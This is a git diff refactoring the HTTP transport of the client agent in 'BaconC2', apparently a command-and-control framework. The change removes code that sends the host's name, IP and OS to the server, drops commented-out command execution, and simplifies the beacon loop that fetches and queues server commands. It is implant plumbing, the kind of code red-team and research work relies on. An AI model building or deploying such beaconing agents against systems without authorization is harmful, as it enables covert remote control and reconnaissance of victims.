@@ -11,7 +11,6 @@ import (
 
 	"github.com/RabbITCybErSeC/BaconC2/pkg/models"
 
-	"github.com/RabbITCybErSeC/BaconC2/client/core/sysinfo"
 	local_models "github.com/RabbITCybErSeC/BaconC2/client/models"
 	"github.com/RabbITCybErSeC/BaconC2/pkg/queue"
 )
@@ -70,49 +69,8 @@ func (t *HTTPTransport) RunProtocol() error {
 	t.beaconLoop()
 	return nil
 }
-func (t *HTTPTransport) beacon() {
-	// Gather minimal system info for every beacon
-	sysInfo, err := sysinfo.GatherMinimalInfo(ProtocolName)
-	if err != nil {
-		log.Printf("Failed to gather minimal system info: %v", err)
-	} else {
-		result := models.CommandResult{
-			ID:     fmt.Sprintf("sysinfo-%d", time.Now().UnixNano()),
-			Status: "success",
-			Output: fmt.Sprintf("Hostname: %s, IP: %s, OS: %s, Protocol: %s",
-				sysInfo.Hostname, sysInfo.IP, sysInfo.OS, sysInfo.Protocol),
-		}
-		if err := t.resultQueue.Add(result); err != nil {
-			log.Printf("Failed to queue minimal system info: %v", err)
-		}
-	}
-
-	// Beacon to server and check if results are requested
-	cmd, err := t.Beacon()
-	if err != nil {
-		log.Printf("Beacon error: %v", err)
-		return
-	}
-
-	// Send queued results if requested
-	if cmd.Command == models.ResultsRequestCommand {
-
-	}
-
-	// if cmd.ID != "" && cmd.Command != "" {
-	// 	log.Printf("Received command %s: %s", cmd.ID, cmd.Command)
-	// 	// Execute the command using the executor
-	// 	result := c.commandExecutor.Execute(cmd)
-	// 	if result.Status == "error" {
-	// 		log.Printf("Command %s failed: %s", cmd.ID, result.Output)
-	// 	} else {
-	// 		log.Printf("Command %s queued result", cmd.ID)
-	// 	}
-	// }
-}
 
 func (t *HTTPTransport) sendBeacon() error {
-	var emptyCmd models.Command
 
 	url := fmt.Sprintf(beaconAPIPath, t.serverURL, t.agentID)
 	resp, err := t.httpClient.Post(url, "application/json", nil)
@@ -125,13 +83,7 @@ func (t *HTTPTransport) sendBeacon() error {
 		body, _ := io.ReadAll(resp.Body)
 		return fmt.Errorf("beacon failed with status %d: %s", resp.StatusCode, string(body))
 	}
-
-	var response struct {
-		Command        models.Command `json:"command"`
-		Status         string         `json:"status,omitempty"`
-		NextBeacon     int            `json:"nextBeacon,omitempty"`
-		RequestResults bool           `json:"requestResults"`
-	}
+	var response models.HttpBeaconResponse
 	if err := json.NewDecoder(resp.Body).Decode(&response); err != nil {
 		return fmt.Errorf("failed to decode beacon response: %w", err)
 	}
@@ -141,17 +93,11 @@ func (t *HTTPTransport) sendBeacon() error {
 		t.beaconInterval = time.Duration(response.NextBeacon) * time.Second
 	}
 
-	// If only "status" is returned (e.g., "acknowledged"), return an empty command
-	if response.Command.ID == "" && response.Status == "acknowledged" {
-		return emptyCmd, response.RequestResults, nil
-	}
-
-	// Add command to queue
 	if err := t.commandQueue.Add(response.Command); err != nil {
-		return emptyCmd, response.RequestResults, fmt.Errorf("failed to queue command: %w", err)
+		return fmt.Errorf("failed to queue command: %w", err)
 	}
 
-	return response.Command, response.RequestResults, nil
+	return nil
 }
 
 func (t *HTTPTransport) SendResults() error {
@@ -200,7 +146,9 @@ func (t *HTTPTransport) beaconLoop() {
 		case <-t.stopChan:
 			return
 		case <-ticker.C:
-			t.sendBeacon()
+			if err := t.sendBeacon(); err != nil {
+				log.Printf("Beacon send failed: %v", err)
+			}
 		}
 	}
 }
